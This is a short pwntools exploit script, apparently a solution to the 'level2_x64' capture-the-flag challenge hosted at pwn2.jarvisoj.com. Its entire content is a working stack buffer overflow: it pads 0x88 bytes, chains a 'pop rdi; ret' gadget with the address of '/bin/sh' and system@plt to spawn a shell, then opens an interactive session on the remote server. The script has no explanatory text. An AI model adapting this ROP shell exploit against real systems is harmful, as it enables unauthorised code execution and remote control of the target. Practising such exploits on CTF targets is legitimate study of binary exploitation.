#!/usr/bin/python
from pwn import *
elf = ELF('./level2_x64')
#sh = process('./level2_x64')
sh = remote('pwn2.jarvisoj.com',9882)
bin_sh = 0x600a90
pop_rdi_ret = 0x4006b3
system = elf.plt['system']
pad = 'a'*0x88
payload = pad + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
sh.recv()
sh.sendline(payload)
sh.interactive()
